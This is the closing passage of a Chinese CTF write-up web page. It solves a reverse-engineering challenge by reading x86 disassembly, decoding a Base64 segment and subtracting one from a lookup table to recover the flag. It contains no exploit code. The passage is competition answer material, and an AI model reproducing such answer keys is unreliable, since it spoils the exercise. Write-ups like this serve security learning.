+mov     <span class="token punctuation">[</span>ebp+eax-100<span class="token punctuation">]</span>, dl
+inc     dl
+inc     eax
+<span class="token function">cmp</span>     dl, <span class="token string">'9'</span>
+jle     short loc_403138
+push    ebx
+push    esi
+push    edi
+mov     word ptr <span class="token punctuation">[</span>ebp+eax-64h<span class="token punctuation">]</span>, <span class="token string">'/+'</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><p>因为为避免明文泄露，肯定会有Base64加密后的密文出现，即cmVhbEN0Rl8=。之后会将输入的第10位开始的8位进行Base64加密，与该密文进行对比。由于开启了优化，这段代码是纯数学运算，因此跳过，直接解密密文后得到realCtF_。至此前17位已经得到：flag{The_realCtF_xxxxxxxxxx}。ebx+8为输入的第18位，eax取该地址后，再进行下一步加密。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>mov     dword ptr <span class="token punctuation">[</span>ebp-10h<span class="token punctuation">]</span>, <span class="token string">'hVmc'</span>
+mov     dword ptr <span class="token punctuation">[</span>ebp-0Ch<span class="token punctuation">]</span>, <span class="token string">'0NEb'</span>
+mov     dword ptr <span class="token punctuation">[</span>ebp-8<span class="token punctuation">]</span>, <span class="token string">'=8lR'</span>
+…………
+lea     eax, <span class="token punctuation">[</span>ebx+8<span class="token punctuation">]</span>
+push    eax
+call    ecx
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>第五步：首先进行加密列表的初始化，得到：kvtu`C4h&quot;o。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>mov     dword ptr <span class="token punctuation">[</span>ebp-0Ch<span class="token punctuation">]</span>, <span class="token string">'utvk'</span>
+push    esi
+push    edi
+mov     dword ptr <span class="token punctuation">[</span>ebp-8<span class="token punctuation">]</span>, <span class="token string">'h4C`'</span>
+or      edx, 0FFFFFFFFh
+mov     word ptr <span class="token punctuation">[</span>ebp-4<span class="token punctuation">]</span>, <span class="token string">'o&quot;'</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>之后将输入值的第18位的地址传入esi中，esi+edi为加密列表的地址，即比较ecx与eax。并且ecx=加密列表每一个字符减一的值，eax=为输入第18位开始的值。循环比较10次，相等则继续，不等则退出。为得到明文，只要将密文6B 76 74 75 60 43 34 68 22 每一位都减一即可，得到6A 75 73 74 5F 42 33 67 21 ，即为：just_B3g!</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>movsx   ecx, byte ptr <span class="token punctuation">[</span>edi+esi<span class="token punctuation">]</span>
+movsx   eax, byte ptr <span class="token punctuation">[</span>esi<span class="token punctuation">]</span>
+dec     ecx
+<span class="token function">cmp</span>     eax, ecx
+jnz     short loc_4032EA
+inc     ebx
+inc     esi
+<span class="token function">cmp</span>     ebx, edx
+jl      short loc_4032D8
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>综上，得到flag{The_realCtF_just_B3g!n}。</p> <h2 id="pwn"><a href="#pwn" class="header-anchor">#</a> PWN</h2> <p>我太菜了，完全不会啊。</p></div> <footer class="page-edit" style="display:none;"><!----> <div class="last-updated"><span class="prefix">最后更新时间: </span> <span class="time">2020年7月23日 07:05</span></div></footer> <!----> <!----> <ul class="side-bar sub-sidebar-wrapper" style="width:12rem;" data-v-40a3448a><li class="level-2" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#misc" class="sidebar-link" data-v-40a3448a>MISC</a></li><li class="level-3" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#签到题" class="sidebar-link" data-v-40a3448a>签到题</a></li><li class="level-3" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#school-song" class="sidebar-link" data-v-40a3448a>School song</a></li><li class="level-3" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#digital-image-processing-1" class="sidebar-link" data-v-40a3448a>Digital Image Processing 1</a></li><li class="level-3" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#digital-image-processing-2" class="sidebar-link" data-v-40a3448a>Digital Image Processing 2</a></li><li class="level-3" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#hacker" class="sidebar-link" data-v-40a3448a>Hacker</a></li><li class="level-3" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#lsb-picture" class="sidebar-link" data-v-40a3448a>LSB Picture</a></li><li class="level-2" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#crypto" class="sidebar-link" data-v-40a3448a>CRYPTO</a></li><li class="level-3" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#base" class="sidebar-link" data-v-40a3448a>Base</a></li><li class="level-3" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#我都不好意思说这是加密" class="sidebar-link" data-v-40a3448a>我都不好意思说这是加密</a></li><li class="level-3" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#超超超简单的rsa" class="sidebar-link" data-v-40a3448a>超超超简单的RSA</a></li><li class="level-2" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#web" class="sidebar-link" data-v-40a3448a>WEB</a></li><li class="level-3" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#暴打出题人" class="sidebar-link" data-v-40a3448a>暴打出题人</a></li><li class="level-3" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#just-trick" class="sidebar-link" data-v-40a3448a>just trick</a></li><li class="level-3" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#textwall" class="sidebar-link" data-v-40a3448a>TextWall</a></li><li class="level-3" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#简单的盲注" class="sidebar-link" data-v-40a3448a>简单的盲注</a></li><li class="level-2" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#mobile" class="sidebar-link" data-v-40a3448a>MOBILE</a></li><li class="level-3" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#多谢款待" class="sidebar-link" data-v-40a3448a>多谢款待</a></li><li class="level-3" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#助人为乐" class="sidebar-link" data-v-40a3448a>助人为乐</a></li><li class="level-2" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#reverse" class="sidebar-link" data-v-40a3448a>REVERSE</a></li><li class="level-3" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#reverse1" class="sidebar-link" data-v-40a3448a>reverse1</a></li><li class="level-2" data-v-40a3448a><a href="/writeup/2017-cumtctf-final-writeup.html#pwn" class="sidebar-link" data-v-40a3448a>PWN</a></li></ul></main> <!----></div></div></div></div><div class="global-ui"><!----><div class="back-to-ceiling" style="right:1rem;bottom:6rem;width:2.5rem;height:2.5rem;border-radius:.25rem;line-height:2.5rem;display:none;" data-v-6f76602d data-v-6f76602d><svg t="1574745035067" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="5404" class="icon" data-v-6f76602d><path d="M526.60727968 10.90185116a27.675 27.675 0 0 0-29.21455937 0c-131.36607665 82.28402758-218.69155461 228.01873535-218.69155402 394.07834331a462.20625001 462.20625001 0 0 0 5.36959153 69.94390903c1.00431239 6.55289093-0.34802892 13.13561351-3.76865779 18.80351572-32.63518765 54.11355614-51.75690182 118.55860487-51.7569018 187.94566865a371.06718723 371.06718723 0 0 0 11.50484808 91.98906777c6.53300375 25.50556257 41.68394495 28.14064038 52.69160883 4.22606766 17.37162448-37.73630017 42.14135425-72.50938081 72.80769204-103.21549295 2.18761121 3.04276886 4.15646224 6.24463696 6.40373557 9.22774369a1871.4375 1871.4375 0 0 0 140.04691725 5.34970492 1866.36093723 1866.36093723 0 0 0 140.04691723-5.34970492c2.24727335-2.98310674 4.21612437-6.18497483 6.3937923-9.2178004 30.66633723 30.70611158 55.4360664 65.4791928 72.80769147 103.21549355 11.00766384 23.91457269 46.15860503 21.27949489 52.69160879-4.22606768a371.15156223 371.15156223 0 0 0 11.514792-91.99901164c0-69.36717486-19.13165746-133.82216804-51.75690182-187.92578088-3.42062944-5.66790279-4.76302748-12.26056868-3.76865837-18.80351632a462.20625001 462.20625001 0 0 0 5.36959269-69.943909c-0.00994388-166.08943902-87.32547796-311.81420293-218.6915546-394.09823051zM605.93803103 357.87693858a93.93749974 93.93749974 0 1 1-187.89594924 6.1e-7 93.93749974 93.93749974 0 0 1 187.89594924-6.1e-7z" p-id="5405" data-v-6f76602d></path><path d="M429.50777625 765.63860547C429.50777625 803.39355007 466.44236686 1000.39046097 512.00932183 1000.39046097c45.56695499 0 82.4922232-197.00623328 82.5015456-234.7518555 0-37.75494459-36.9345906-68.35043303-82.4922232-68.34111062-45.57627738-0.00932239-82.52019037 30.59548842-82.51086798 68.34111062z" p-id="5406" data-v-6f76602d></path></svg></div><div class="kanbanniang" data-v-5775ee02><div class="banniang-container" style="display:;" data-v-5775ee02><div class="messageBox" style="right:68px;bottom:190px;display:none;" data-v-5775ee02>
+      欢迎来到 吾行吾道，虽远必至
+    </div> <div class="operation" style="right:90px;bottom:40px;display:none;" data-v-5775ee02><i class="kbnfont kbn-ban-home ban-home" data-v-5775ee02></i> <i class="kbnfont kbn-ban-message message" data-v-5775ee02></i> <i class="kbnfont kbn-ban-close close" data-v-5775ee02></i> <a target="_blank" href="https://vuepress-theme-reco.recoluan.com/views/plugins/kanbanniang.html" data-v-5775ee02><i class="kbnfont kbn-ban-info info" data-v-5775ee02></i></a> <i class="kbnfont kbn-ban-theme skin" style="display:none;" data-v-5775ee02></i></div> <canvas id="banniang" width="150" height="220" class="live2d" style="right:10px;bottom:10px;opacity:0.9;" data-v-5775ee02></canvas></div> <div class="showBanNiang" style="display:none;" data-v-5775ee02>
+    看板娘
+  </div></div><canvas id="vuepress-canvas-cursor"></canvas></div></div>
+    <script src="/assets/js/app.b32307b1.js" defer></script><script src="/assets/js/4.1982f64f.js" defer></script><script src="/assets/js/1.88520771.js" defer></script><script src="/assets/js/143.2ab1b291.js" defer></script><script src="/assets/js/33.5eacd5c8.js" defer></script>
+  </body>
+</html>
